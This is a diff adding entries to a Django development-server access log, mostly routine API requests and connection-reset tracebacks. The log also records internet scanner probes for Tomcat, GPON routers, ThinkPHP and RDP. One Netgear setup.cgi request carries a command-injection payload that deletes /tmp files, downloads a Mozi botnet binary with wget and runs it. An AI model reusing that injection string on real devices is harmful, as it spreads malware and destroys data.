@@ -2732,3 +2732,616 @@ Not Found: /favicon.ico
 [14/Dec/2020 08:15:06] "GET /api/vi/ddobakis/ HTTP/1.1" 200 112648
 Watching for file changes with StatReloader
 [14/Dec/2020 08:24:52] "GET /api/vi/ddobakis/ HTTP/1.1" 200 112661
+Not Found: /
+[14/Dec/2020 09:02:28] "GET / HTTP/1.1" 404 2131
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.39', 39050)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[14/Dec/2020 09:09:31] "GET / HTTP/1.1" 404 2136
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.39', 38532)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[14/Dec/2020 09:09:31] "GET / HTTP/1.1" 404 2136
+Not Found: /manager/html
+[14/Dec/2020 09:49:12] "GET /manager/html HTTP/1.1" 404 2190
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+[14/Dec/2020 11:08:47] "GET /manager/html HTTP/1.1" 400 61530
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.39', 55578)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[14/Dec/2020 12:27:55] "GET / HTTP/1.1" 404 2136
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.39', 36272)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[14/Dec/2020 12:27:56] "GET / HTTP/1.1" 404 2136
+Not Found: /
+[14/Dec/2020 12:32:19] "GET / HTTP/1.1" 404 2136
+Not Found: /GponForm/diag_Form
+[14/Dec/2020 12:55:28] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2215
+----------------------------------------
+Exception happened during processing of request from ('202.164.139.205', 53928)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+[14/Dec/2020 14:31:30] "GET /manager/html HTTP/1.1" 400 61530
+Not Found: /http:/123.125.114.144/
+[14/Dec/2020 15:48:49] "HEAD http://123.125.114.144/ HTTP/1.1" 404 1682
+Not Found: /http:/nginx.korsangazi.com/scan.html
+[14/Dec/2020 16:31:05] "GET http://nginx.korsangazi.com/scan.html HTTP/1.1" 404 1728
+Not Found: /
+[14/Dec/2020 16:42:24] "GET / HTTP/1.1" 404 2136
+Not Found: /menu.html
+[14/Dec/2020 16:42:24] "GET /menu.html?images/ HTTP/1.1" 404 2189
+----------------------------------------
+Exception happened during processing of request from ('194.146.86.178', 1199)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /GponForm/diag_FORM
+[14/Dec/2020 16:42:24] "GET /GponForm/diag_FORM?images/ HTTP/1.1" 404 2216
+Not Found: /setup.cgi
+[14/Dec/2020 17:45:13] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2380
+[14/Dec/2020 18:25:37] code 400, message Bad request syntax ('\x16\x03\x01\x00\x89\x01\x00\x00\x85\x03\x03Cúda-v0í\x85g\x04Û_\x84\x00.ð\x9e-n,6ä%\x8d÷Ùï_*Ï\x89\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
+[14/Dec/2020 18:25:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[14/Dec/2020 18:25:59] "GET / HTTP/1.1" 404 2136
+Not Found: /hudson
+[14/Dec/2020 18:41:40] "GET /hudson HTTP/1.1" 404 2172
+Bad Request: /api/vi/ddobakis/
+[14/Dec/2020 19:22:30] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[14/Dec/2020 19:23:01] "GET /api/vi/ddobakis/ HTTP/1.1" 200 112661
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/jquery-3.5.1.min.js HTTP/1.1" 200 89476
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[14/Dec/2020 19:23:01] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+Not Found: /favicon.ico
+[14/Dec/2020 19:23:01] "GET /favicon.ico HTTP/1.1" 404 2228
+[14/Dec/2020 19:23:06] "GET /api/vi/ddobakis/ HTTP/1.1" 200 112661
+[14/Dec/2020 19:23:16] "GET /api/vi/ddobakis/ HTTP/1.1" 200 112661
+[14/Dec/2020 19:23:23] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[14/Dec/2020 19:23:27] "GET /api/vi/ddobakis/ HTTP/1.1" 200 113156
+[14/Dec/2020 19:23:36] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[14/Dec/2020 19:23:39] "GET /api/vi/ddobakis/ HTTP/1.1" 200 113651
+[14/Dec/2020 19:24:22] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+Not Found: /
+[14/Dec/2020 19:48:21] "GET / HTTP/1.1" 404 2136
+Not Found: /TP/public/index.php
+[14/Dec/2020 21:37:38] "GET /TP/public/index.php HTTP/1.1" 404 2211
+Not Found: /TP/index.php
+[14/Dec/2020 21:37:38] "GET /TP/index.php HTTP/1.1" 404 2190
+Not Found: /thinkphp/html/public/index.php
+[14/Dec/2020 21:37:38] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2244
+Not Found: /html/public/index.php
+[14/Dec/2020 21:37:39] "GET /html/public/index.php HTTP/1.1" 404 2217
+Not Found: /public/index.php
+[14/Dec/2020 21:37:39] "GET /public/index.php HTTP/1.1" 404 2202
+Not Found: /TP/html/public/index.php
+[14/Dec/2020 21:37:40] "GET /TP/html/public/index.php HTTP/1.1" 404 2226
+Not Found: /elrekt.php
+[14/Dec/2020 21:37:40] "GET /elrekt.php HTTP/1.1" 404 2184
+Not Found: /index.php
+[14/Dec/2020 21:37:41] "GET /index.php HTTP/1.1" 404 2181
+Not Found: /users
+[14/Dec/2020 21:37:41] "POST /users?page=&size=5 HTTP/1.1" 404 2187
+Not Found: /
+[14/Dec/2020 21:37:41] "GET / HTTP/1.1" 404 2136
+[14/Dec/2020 21:55:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Dec/2020 21:55:01] "  /*à     Cookie: mstshash=Administr" 400 -
+Bad Request: /api/vi/ddobakis/
+[14/Dec/2020 22:32:56] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[14/Dec/2020 22:33:10] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[14/Dec/2020 22:33:19] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+Not Found: /
+[15/Dec/2020 00:23:16] "GET / HTTP/1.1" 404 2136
+[15/Dec/2020 00:42:38] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 00:42:45] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 00:42:51] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 00:42:56] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 00:43:02] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 00:43:08] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 00:43:15] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 00:43:20] "POST /api/vi/ddobakis/ HTTP/1.1" 201 195
+[15/Dec/2020 00:43:25] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 00:43:30] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 00:43:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Dec/2020 00:43:30] "  /*à     Cookie: mstshash=Administr" 400 -
+[15/Dec/2020 00:43:35] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 00:43:40] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 00:43:45] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 00:43:49] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 00:43:53] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 00:49:22] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 00:49:28] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 00:49:34] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 00:49:39] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 00:49:44] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 00:49:53] "POST /api/vi/ddobakis/ HTTP/1.1" 201 199
+[15/Dec/2020 00:49:59] "POST /api/vi/ddobakis/ HTTP/1.1" 201 198
+[15/Dec/2020 00:50:11] "POST /api/vi/ddobakis/ HTTP/1.1" 201 214
+[15/Dec/2020 00:50:18] "POST /api/vi/ddobakis/ HTTP/1.1" 201 214
+[15/Dec/2020 00:50:22] "POST /api/vi/ddobakis/ HTTP/1.1" 201 213
+[15/Dec/2020 00:50:26] "POST /api/vi/ddobakis/ HTTP/1.1" 201 214
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 01:00:47] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 01:00:52] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 01:00:56] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 01:01:01] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 01:01:06] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 01:01:10] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 01:01:14] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 01:01:19] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 01:01:24] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 01:01:29] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 01:01:34] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 01:01:40] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 01:01:43] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 52189)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[15/Dec/2020 02:03:57] "GET / HTTP/1.0" 404 2136
+[15/Dec/2020 02:08:14] "GET /api/vi/ddobakis/ HTTP/1.1" 200 132177
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/js/jquery-3.5.1.min.js HTTP/1.1" 304 0
+[15/Dec/2020 02:08:15] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+[15/Dec/2020 03:27:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Dec/2020 03:27:19] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /
+[15/Dec/2020 04:19:06] "GET / HTTP/1.0" 404 2173
+Not Found: /
+[15/Dec/2020 04:30:53] "GET / HTTP/1.1" 404 2136
+Not Found: /
+[15/Dec/2020 05:53:54] "GET / HTTP/1.0" 404 2173
+Not Found: /
+[15/Dec/2020 09:08:33] "GET / HTTP/1.1" 404 2131
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.55', 43464)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[15/Dec/2020 10:15:07] "GET / HTTP/1.1" 404 2136
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.55', 44882)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[15/Dec/2020 10:15:07] "GET / HTTP/1.1" 404 2136
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 10:57:06] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 10:57:09] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 10:57:12] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 10:57:17] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 10:57:23] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 10:57:28] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 10:57:33] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 10:57:39] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 10:57:44] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 11:24:32] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 11:24:35] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 11:24:39] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 11:24:43] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 11:24:47] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 11:24:52] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 11:24:56] "POST /api/vi/ddobakis/ HTTP/1.1" 201 195
+[15/Dec/2020 11:25:00] "POST /api/vi/ddobakis/ HTTP/1.1" 201 204
+[15/Dec/2020 11:25:05] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 11:25:09] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 11:25:14] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 11:25:18] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 56021)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /actuator/health
+[15/Dec/2020 11:27:21] "GET /actuator/health HTTP/1.1" 404 2199
+----------------------------------------
+Exception happened during processing of request from ('37.9.13.92', 20876)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+[15/Dec/2020 11:46:06] "GET /manager/html HTTP/1.1" 400 61530
+Not Found: /manager/html
+[15/Dec/2020 12:36:32] "GET /manager/html HTTP/1.1" 404 2190
+Not Found: /
+[15/Dec/2020 12:40:23] "GET / HTTP/1.1" 404 2136
+[15/Dec/2020 14:27:50] "GET /api/vi/ddobakis/ HTTP/1.1" 200 141147
+[15/Dec/2020 14:27:50] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 14:32:01] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 14:32:07] "POST /api/vi/ddobakis/ HTTP/1.1" 201 213
+[15/Dec/2020 14:32:11] "GET /api/vi/ddobakis/ HTTP/1.1" 200 141663
+[15/Dec/2020 14:32:24] "POST /api/vi/ddobakis/ HTTP/1.1" 201 213
+Not Found: /
+[15/Dec/2020 14:41:03] "GET / HTTP/1.1" 404 2136
+[15/Dec/2020 15:19:55] "POST /api/vi/ddobakis/ HTTP/1.1" 201 210
+[15/Dec/2020 15:19:58] "GET /api/vi/ddobakis/ HTTP/1.1" 200 142692
+[15/Dec/2020 15:20:09] "POST /api/vi/ddobakis/ HTTP/1.1" 201 222
+[15/Dec/2020 15:20:13] "GET /api/vi/ddobakis/ HTTP/1.1" 200 143217
+[15/Dec/2020 15:20:39] "POST /api/vi/ddobakis/ HTTP/1.1" 201 219
+[15/Dec/2020 15:20:43] "GET /api/vi/ddobakis/ HTTP/1.1" 200 143739
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 15:31:10] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 15:31:20] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 15:31:40] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 15:31:47] "POST /api/vi/ddobakis/ HTTP/1.1" 201 192
+[15/Dec/2020 15:31:54] "POST /api/vi/ddobakis/ HTTP/1.1" 201 195
+[15/Dec/2020 15:31:59] "POST /api/vi/ddobakis/ HTTP/1.1" 201 194
+[15/Dec/2020 15:32:03] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+[15/Dec/2020 15:32:28] "POST /api/vi/ddobakis/ HTTP/1.1" 201 193
+----------------------------------------
+Exception happened during processing of request from ('112.152.69.155', 58278)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/rest_env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Bad Request: /api/vi/ddobakis/
+[15/Dec/2020 15:41:39] "POST /api/vi/ddobakis/ HTTP/1.1" 400 52
+[15/Dec/2020 15:42:15] "POST /api/vi/ddobakis/ HTTP/1.1" 201 197
+[15/Dec/2020 15:43:58] "GET /api/vi/ddobakis/ HTTP/1.1" 200 147716
+[15/Dec/2020 15:48:08] "POST /api/vi/ddobakis/ HTTP/1.1" 201 214
+[15/Dec/2020 15:48:56] "GET /api/vi/ddobakis/ HTTP/1.1" 200 148233
+Not Found: /
+[15/Dec/2020 15:52:15] "GET / HTTP/1.1" 404 2136
+[15/Dec/2020 16:28:33] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03m\x81\x8d\x8c*jnl»Ú¢J\x9ct²þ;\x06\x88f®ÞÃ§\x04\x07×\x15ÐÝ¾f ë {³GD>Çm\x8a\x05\x19õõ;ù\x94ó»°7\x95È@Ý¥`Ãv{[_\x00&À/À0À+À,Ì¨Ì©À\x13À\tÀ\x14À')
+[15/Dec/2020 16:28:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[15/Dec/2020 16:28:34] "GET / HTTP/1.0" 404 2136
+[15/Dec/2020 17:00:35] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03L:ê\x9fEÊ¼×\x0ft\x18ù\x1eËÊv¬\x92f\x86µî\x01¹{Ú%\x88\x03\x8a×\x90 t\x8d#\x95C©\x15\x02¸vª)\x9c/dX¨\x18«Î\x7f\x01ìa®Q$\x01Á\x11\x10,\x00&À/À0À+À,Ì¨Ì©À\x13À\tÀ\x14À')
+[15/Dec/2020 17:00:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[15/Dec/2020 17:00:36] "GET / HTTP/1.1" 404 2136
+Not Found: /
+[15/Dec/2020 19:17:17] "GET / HTTP/1.0" 404 2173
+Bad Request: /api/vi/ddobakis/
